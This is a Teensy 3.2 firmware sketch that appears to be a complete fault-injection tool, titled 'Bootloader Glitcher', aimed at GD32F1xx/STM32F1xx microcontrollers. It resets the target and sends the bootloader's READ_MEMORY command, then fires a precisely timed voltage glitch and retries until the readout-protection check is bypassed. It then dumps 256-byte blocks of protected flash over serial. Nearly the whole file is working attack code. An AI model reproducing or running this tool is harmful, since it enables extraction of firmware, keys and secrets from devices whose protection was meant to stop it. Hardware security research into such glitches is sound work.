/* For Teensy 3.2 */
#define CMD_GET               0x00
#define CMD_GET_VERSION       0x01
#define CMD_GET_ID            0x02
#define CMD_READ_MEMORY       0x11
#define CMD_GO                0x21
#define CMD_WRITE_MEMORY      0x31
#define CMD_ERASE             0x43
#define WRITE_PROTECT         0x63
#define WRITE_UNPROTECT       0x73
#define CMD_READOUT_PROTECT   0x82
#define CMD_READOUT_UNPROTECT 0x92

// 'wake the bootloader' == 'activate USART' == 'synchronize'
#define SYNCHRONIZE 0x7F

#define ACK  0x79
#define NACK 0x1F

#define TIMEOUT_MS 5

#define GLITCH_PIN 2
#define NRESET_PIN 6

void setup() {
  digitalWrite(GLITCH_PIN, LOW);
  digitalWrite(NRESET_PIN, LOW);
  
  pinMode(GLITCH_PIN, OUTPUT);
  pinMode(NRESET_PIN, INPUT);
  
  digitalWrite(GLITCH_PIN, LOW);
  digitalWrite(NRESET_PIN, LOW);
  
  //Teensy 3.2 USB CDC serial
  Serial.begin(115200);

  //Serial connection to Target
  Serial1.begin(115200, SERIAL_8E1);
}

static void reset_target(void)
{
  pinMode(NRESET_PIN, OUTPUT);
  delay(10);
  pinMode(NRESET_PIN, INPUT);
}

static void log_msg(const char *msg)
{
  Serial.println(msg);
}

static void log_val(const char *msg, uint32_t val)
{
  Serial.print(msg);
  Serial.println(val, HEX);
}

static void log_dec(const char *msg, uint32_t val)
{
  Serial.print(msg);
  Serial.println(val, DEC);
}

static int read_byte(uint8_t *val)
{
  unsigned long timeout = millis() + TIMEOUT_MS;
  uint8_t ack;

  while (Serial1.available() == 0) {
    if (millis() > timeout) {
      return 1;
    }
  }
  
  *val = Serial1.read();
  return 0;
}

static int read_bytes(uint8_t *val, unsigned len)
{
  int ret;
  unsigned i;
  for (i=0; i<len; i++)
  {
    ret = read_byte(&val[i]);
    if (ret)
      return ret;
  }

  return ret;
}


static int checkAck(void)
{
  int ret;
  uint8_t ack;
 
  ret = read_byte(&ack);
  if (ret) {
    log_msg("ERROR: Ack timeout");
    return ret;
  }

  if (ack == NACK) {
    return 1;
  }
  else if (ack == ACK) {
    return 0;
  }
  else {
    log_val("ERROR: Unknow ACK value: ", ack);
    return 1;
  }
}

static int sendCommand(uint8_t cmd)
{
  uint8_t cmd_pkt[2] = {cmd, cmd ^ 0xff};
  Serial1.write(cmd_pkt, 2);

  return checkAck();
}

static int synchronize(void)
{
  int ret;
  uint8_t val;

  Serial1.write(SYNCHRONIZE);
  ret = read_byte(&val);
  if (ret)
    return ret;

  if (val == NACK || val == ACK)
    return 0;

  return 1;
}

static void die(void)
{
  log_msg("DIE!!!");
  while(1) continue;
}

static int do_get(void)
{
  int ret;
  uint8_t len, ver, i;
  uint8_t buf[256];

  ret = sendCommand(CMD_GET);
  if (ret) {
    log_msg("ERROR: Send GET command failed");
    return 1;
  }

  ret = read_byte(&len);
  ret |= read_byte(&ver);
  if (ret) {
    log_msg("ERROR read length / version fail");
    return 1;
  }

  log_val("Bootloader version: ", ver);

  ret = read_bytes(buf, len);
  if (ret) {
    log_msg("ERROR read cmds fail");
    return 1;
  }

  ret = checkAck();
  if (ret) {
    log_msg("ERROR no ACK");
    return 1;
  }

  for (i=0; i<len; i++) {
    log_val("Support CMD: ", buf[i]);
  }

  return 0;
}




/**
 * Print a single hexadecimal value to the provided stream.
 * The value will be prefixed by zeroes, when required, to force the
 * number of output digits to the 2 times the size of the valueT.
 * @tparam valueT  Type of value to be printed, e.g. size_t or uint8_t.
 * @param  stream  Output stream (e.g. Serial) to print to.
 * @param  val     Value to print as hexadecimal.
 */
template <typename valueT>
void PrintHex( Stream& stream, const valueT val )
{
  const uint8_t digits = sizeof(valueT) << 1;
  uint8_t i = 0;
  while (i < digits)
  {
    valueT v = (val >> ((digits-i-1) << 2)) & valueT(0x0F);     // Each nibble stores 1 digit
    stream.print(v, HEX);
    ++i;
  }
}

/**
 * Dump a block of data as hexadecimal and ASCII to the provided stream.
 * @tparam addrT        Address type. This type determines the amount of digits displayed for
 *                      the address, e.g. size_t to leave it up to the architecture or uint8_t
 *                      to use only a single byte.
 * @tparam bytesPerRow  Number of bytes to print per row, e.g. 16 or 8.
 * @param  stream       Output stream (e.g. Serial) to print to.
 * @param  buff         Ptr to block of data to print.
 * @param  len          Length of block to print, in [bytes].
 * @param  base         Optional address offset to use in priting.
 *
 * A typical example to dump a block of data to the serial console:
 * @code
 * uint8_t data[100];
 * HexDump(Serial, data, sizeof(data));
 * @endcode
*/
template <typename addrT = size_t, uint8_t bytesPerRow = 16>
void HexDump( Stream& stream, void* buff, size_t len, addrT base = 0 )
{
  uint8_t* p = reinterpret_cast<uint8_t*>(buff);
  const size_t rows = (len + bytesPerRow-1) / bytesPerRow;

  for (size_t r = 0; r < rows; ++r)
  {
    char* pc = reinterpret_cast<char*>(p);
    const size_t cols = len < bytesPerRow ? len : bytesPerRow;
    for (size_t c = 0; c < bytesPerRow; ++c)
    {
      if (c < cols)
      {
        PrintHex<uint8_t>(stream, *p++);
      }
      else
      {
        stream.print(F("  "));
      }
      stream.print(F(" "));
    }
    
    stream.println(F(""));
    len -= bytesPerRow;
    yield();
  }
}

static int read_memory_glitch(uint32_t address, uint8_t *buf, size_t len, unsigned waitcnt)
{
  int ret;
  uint8_t ack;
  uint8_t addr_pkt[5];
  uint8_t len_pkt[5];

  Serial1.flush();
  

  noInterrupts();

  UART0_D = CMD_READ_MEMORY;
  UART0_D = (uint8_t)(~CMD_READ_MEMORY);

  asm volatile ("   mov   r1, %0\n"
                "1: subs  r1, r1, #1 \n"
                "   bne   1b" : : "r" (waitcnt) : "r1");

  CORE_PIN2_PORTSET = CORE_PIN2_BITMASK;
  asm volatile ("   movs   r1, #16\n"
                "1: subs  r1, r1, #1 \n"
                "   bne   1b" : : : "r1");
  CORE_PIN2_PORTCLEAR = CORE_PIN2_BITMASK;

  interrupts();

  ret = read_byte(&ack);
  if (ret) {
    log_msg("ERROR: Ack timeout");
    return ret;
  }

  if (ack == NACK) {
    return 2;
  }
  else if (ack == ACK) {
    log_msg("Got ACK - Glitch Success");
  }
  else {
    log_val("ERROR: Unknow ACK value: ", ack);
    return 1;
  }


  addr_pkt[0] = (address >> 24) & 0xff;
  addr_pkt[1] = (address >> 16) & 0xff;
  addr_pkt[2] = (address >> 8) & 0xff;
  addr_pkt[3] = address & 0xff;
  addr_pkt[4] = addr_pkt[0] ^ addr_pkt[1] ^ addr_pkt[2] ^ addr_pkt[3];
  Serial1.write(addr_pkt, 5);
  ret = checkAck();
  if (ret) {
    log_msg("ERROR no ACK (addr)");
    return 1;
  }

  len_pkt[0] = (len - 1) & 0xff;
  len_pkt[1] = len_pkt[0] ^ 0xff;
  Serial1.write(len_pkt, 2);
  ret = checkAck();
  if (ret) {
    log_msg("ERROR no ACK (len)");
    return 1;
  }

  ret = read_bytes(buf, len);
  if (ret) {
    log_msg("ERROR read fail");
    return 1;
  }

  return 0;
}

static void do_reset_sync(void)
{
  int ret;

  while(1) {
    Serial.println("Chip Reset...");
    reset_target();
          delay(100);
    
    Serial.println("Synchronize...");
    for(int i = 0; i < 10; i++) {
      ret = synchronize();
      if (ret) {
      }
      else {
        return;
      }
    }
  }
}

void loop() {
  int ret;
  static uint8_t buf[256];
  uint32_t addr;

loop1:

  while(!Serial.available())
    continue;

  addr = Serial.read();
  addr = (addr << 8) | Serial.read();
  addr = (addr << 8) | Serial.read();
  addr = (addr << 8) | Serial.read();

  Serial.println("GD32F1xx/STM32F1xx Bootloader Glitcher v0.1 - Maximus64");
  log_val("address: ", addr);
  
  unsigned waitcnt = 6300;

  do_reset_sync();

  log_msg("Send GET command...");
  ret = do_get();
  if (ret) {
    log_msg("GET command failed");
    die();
  }

  while (1)
  {
    do_reset_sync();

    while(1) {
      ret = read_memory_glitch(addr, buf, 256, waitcnt);
      if (ret == 0) 
      {
        log_msg("<<STARTDUMP>>");
        HexDump(Serial, buf, 256);
        log_msg("<<DONE>>");
        goto loop1;
      }
      if (ret != 2)
      {
        break;
      }
    }
  }

  log_msg("END");
  while(1) continue;
}
